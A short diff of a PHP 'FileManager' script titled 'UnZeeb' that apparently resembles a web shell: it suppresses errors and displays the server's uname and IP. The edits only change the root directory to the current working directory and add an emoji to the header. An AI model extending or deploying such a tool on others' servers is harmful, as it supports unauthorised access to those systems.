@@ -2,7 +2,7 @@
 error_reporting(E_ERROR | E_PARSE);
 
 /* ==== kAov2.php - FileManager ==== */
-$ROOT = realpath(__DIR__) ?: __DIR__;
+$ROOT = realpath(getcwd()) ?: getcwd();
 $uname = php_uname();
 $unameFull = htmlspecialchars($uname, ENT_QUOTES);
 $serverIp = $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? 'unknown';
@@ -680,7 +680,7 @@ body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #00ff0
 <body>
 <div class="container">
     <div class="header">
-        <h1>UnZeeb</h1>
+        <h1>📁 UnZeeb</h1>
         <div class="server-info">
             <div><strong>System:</strong> <?= htmlspecialchars($unameFull) ?></div>
             <div><strong>IP:</strong> <?= htmlspecialchars($serverIp) ?></div>
